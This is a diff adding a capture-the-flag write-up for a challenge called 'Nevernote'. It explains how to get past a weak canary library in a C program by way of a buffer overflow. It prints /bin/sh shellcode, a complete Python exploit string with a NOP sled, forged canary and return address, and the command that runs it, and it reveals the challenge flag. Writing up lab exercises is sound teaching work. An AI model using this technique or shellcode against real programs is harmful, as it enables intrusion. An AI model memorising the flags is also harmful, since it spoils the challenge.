@@ -745,6 +745,36 @@ Now that we can succesfully run commands, it's just a matter of sending the "cat
 
 FLAG: arent_signature_forgeries_just_great
 -------------------------------
+Nevernote - 180
+
+Wow, I had a lot of trouble on this. Not that it was all that hard, but I just ran into a lot of problems along the way.
+We are given 3 C-files and we have to find a way to get around the buffer overflow detection library. When we take a look at the library, it is clear that it was badly designed:
+(file canary.h)
+struct safe_buffer{
+    char buf[SAFE_BUFFER_SIZE];
+    struct canary can;
+};
+
+If we are able to overflow the buffer, we will overwrite 'can', so we can just fill it with data that will pass the check. This check is done by generating a random integer, storing it on the heap, saving the integer and the address in a struct, and comparing the saved integer and the value at the saved address. At first glance, we could use any address we know the value of (for example somewhere in the text segment), but when we look at function verify_canary, we see that the memory address is freed at the end. This means we should find some other malloced address and use that. Luckily for us, a buffer is allocated for the name of the note file (note_file_path in function command_loop). Because there's no ASLR, we can find out the address of the buffer (with gdb), and we also know the value stored there: "\hom" which is stored as 0x6d6f682f. If ASLR was active, I would try to recreate a heap chunk at the start of the buffer we are overflowing (by adding tag data); not sure if this would work though.
+
+We now have a way to buffer overflow, while still passing the check at the end. It's time to create our exploit string. The layout we want is: username, newline, "a", newline, nop sled, shellcode, value, address, some junk, ret address, 'dest' address. 
+The reason we are overwriting the variable 'dest' (with the same value), is because there is a strncpy between overflowing the buffer and the verification of the canary. If we didn't rewrite the address, we would write "\x0a\x00" into that address (making that address 0x0804000a), meaning the strncpy would overwrite the memory where the note filename is stored (0x0804c008), making our canary invalid. It would also throw an error, because 0x0804000a can't be freed. Long story short, we just overwrite dest with the same value to avoid any problems.
+
+Let's determine the things we need for exploit string:
+- The address of the stored file name is 0x804c008 and the value at that address is 0x6d6f682f ("\hom").
+- Our shellcode is "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" (21 bytes long)
+- The return address should be somewhere in the middle of our nop sled: 0xffffd504
+- dest (passed as argument) = 0x0804c050
+
+Just a little advice if you want to efficiently debug the code with gdb: save the input in a file and then call "run < filename" in gdb. Afterwards, you can even reuse this file to execute the exploit.
+
+Saving our exploit string in a file:
+python -c 'print "bob\na\n" + "\x90"*(512-21) + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "/hom" + "\x08\xc0\x04\x08" + "aaaabbbbccccdddd"+"\x04\xd5\xff\xff"+"\x50\xc0\x04\x08"' > /tmp/delilled/nevernote/sh
+
+Executing the exploit:
+cat /tmp/delilled/nevernote/sh - | ./nevernote
+
+We got shell! FLAG = the_hairy_canary_fairy_is_still_very_wary
 -------------------------------
 -------------------------------
 -------------------------------
